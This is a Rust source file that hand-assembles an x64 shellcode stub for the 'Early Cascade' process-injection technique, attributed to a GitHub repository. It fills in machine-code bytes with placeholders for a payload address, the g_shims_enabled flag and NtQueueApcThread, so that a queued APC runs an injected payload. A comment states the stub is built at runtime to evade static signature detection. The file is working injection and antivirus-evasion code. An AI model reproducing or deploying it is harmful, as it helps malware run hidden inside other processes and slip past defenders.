// Cascade Stub x64
// From: https://github.com/Whitecat18/earlycascade-injection/blob/main/src/main.rs
pub fn get_stub() -> Vec<u8> {
    // 动态生成 Stub 以避免静态签名检测
    let mut stub = vec![0u8; 66];
    // 0..4: sub rsp, 38h
    stub[0..4].copy_from_slice(&[0x48, 0x83, 0xec, 0x38]);
    // 4..6: xor eax, eax
    stub[4..6].copy_from_slice(&[0x33, 0xc0]);
    // 6..9: xor r9d, r9d
    stub[6..9].copy_from_slice(&[0x45, 0x33, 0xc9]);
    // 9..14: and [rsp+38h+var_18], rax
    stub[9..14].copy_from_slice(&[0x48, 0x21, 0x44, 0x24, 0x20]);
    // 14..16: mov rdx, (placeholder)
    stub[14..16].copy_from_slice(&[0x48, 0xba]);
    // 16..24: 8 bytes placeholder for payload_addr
    // 24..25: mov ds:[...], al
    stub[24] = 0xa2;
    // 25..33: 8 bytes placeholder for g_shims_enabled
    // 33..35: mov r8, (placeholder)
    stub[33..35].copy_from_slice(&[0x49, 0xb8]);
    // 35..43: 8 bytes placeholder for NtQueueApcThread
    // 43..47: lea rcx, [rax-2]
    stub[43..47].copy_from_slice(&[0x48, 0x8d, 0x48, 0xfe]);
    // 47..49: mov rax, (placeholder)
    stub[47..49].copy_from_slice(&[0x48, 0xb8]);
    // 49..57: 8 bytes placeholder for NtQueueApcThread
    // 57..59: call rax
    stub[57..59].copy_from_slice(&[0xff, 0xd0]);
    // 59..61: xor eax, eax
    stub[59..61].copy_from_slice(&[0x33, 0xc0]);
    // 61..65: add rsp, 38h
    stub[61..65].copy_from_slice(&[0x48, 0x83, 0xc4, 0x38]);
    // 65..66: retn
    stub[65] = 0xc3;
    stub
}